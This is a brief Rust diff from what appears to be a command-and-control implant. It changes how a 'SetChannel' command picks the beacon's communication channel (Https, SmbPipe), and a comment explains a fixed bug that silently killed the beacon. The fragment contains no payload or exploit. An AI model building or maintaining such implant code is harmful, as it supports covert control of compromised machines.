@@ -428,9 +428,11 @@ fn execute(
             vec![Response::Ok]
         }
         Command::SetChannel { channel } => {
-            // Use from_wire_u8 for backward compat with old servers, then map
-            // to the new channel scheme.
-            let ch = crate::channels::Channel::from_wire_u8(channel);
+            // Use from_u8 (new numbering scheme). Values 0-8 map to channels;
+            // out-of-range values default to Https (not SmbPipe — the old bug
+            // MED-NEW-I5 where _ => SmbPipe killed the beacon with a "success"
+            // ack is fixed: from_u8's catch-all is Https, a safe no-op).
+            let ch = crate::channels::Channel::from_u8(channel);
             crate::channels::set_active(ch);
             let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
             out.extend_from_slice(b"Channel set to: ");
